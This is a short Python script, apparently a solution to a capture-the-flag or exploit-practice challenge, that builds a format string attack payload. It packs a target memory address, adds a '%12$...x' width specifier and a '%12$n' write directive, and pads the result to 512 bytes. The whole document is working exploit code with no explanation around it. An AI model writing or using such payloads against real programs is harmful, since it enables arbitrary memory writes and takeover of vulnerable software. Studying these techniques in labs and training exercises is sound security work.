import struct

addr = struct.pack("I", 0x08049810)

def pad(s):
    return s+"A"*(512-len(s))

pl = ""
pl += addr
pl += "%12$16930111x "
pl += "%12$n"
print pad(pl)
